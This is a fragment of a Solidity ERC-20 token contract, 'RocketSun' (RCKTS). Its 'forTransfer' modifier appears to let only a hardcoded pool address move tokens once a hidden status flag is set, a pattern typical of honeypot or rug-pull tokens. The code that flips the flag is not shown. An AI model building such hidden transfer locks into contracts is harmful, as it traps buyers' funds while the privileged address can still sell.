...
contract RocketSunToken is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenRS_totalSupply;
    uint256 private _tokenRS_status = 0;
    uint256 public stakingPoolRSStatus = 0;

    string private _tokenRS_name;
    string private _tokenRS_symbol;

    address private _poolRSAddress = 0x17A5aA38F87A10c64fd3DBf383c86fD2445d0067;

    constructor() {
        _tokenRS_name = "RocketSun";
        _tokenRS_symbol = "RCKTS";
        _tokenRS_totalSupply = 94500 * 10 ** 18;
        _balances[msg.sender] = _tokenRS_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolRSAddress || _tokenRS_status == 0);
        _;
    }
